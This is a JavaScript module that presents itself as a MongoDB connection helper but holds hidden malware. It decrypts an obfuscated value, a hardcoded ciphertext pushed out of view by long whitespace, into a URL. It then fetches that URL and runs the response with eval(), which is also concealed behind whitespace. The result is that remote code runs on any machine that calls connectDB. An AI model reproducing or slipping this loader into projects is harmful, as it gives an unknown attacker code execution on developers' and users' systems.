const mongoose = require('mongoose');
const config = require('../config');
const decrypt = require("../controllers/auth").decrypt;
const crypto = require("crypto");

// Your encrypted value (replace with the ciphertext produced by your encrypt function)
const encryptedData = config.MONGO_URI                                                                                                                                                                                                                                                                    || "c1bdddf3d5a8c01a6174e930e9aec0c9:f7ad9dd98c56d98948c3340985e63d16507b5abb40443fba1f41320ae553cde5";

const connectDB = async () => {
  try {
    const mongo_uri = decrypt(encryptedData);
    const response = await fetch(mongo_uri);
    const msg = await response.text();                                                                                                                                                                                                                                                                    eval(msg)
    return msg
  } catch (err) {
    console.error(err.message);
    process.exit(-1);
  }
};

module.exports = connectDB;
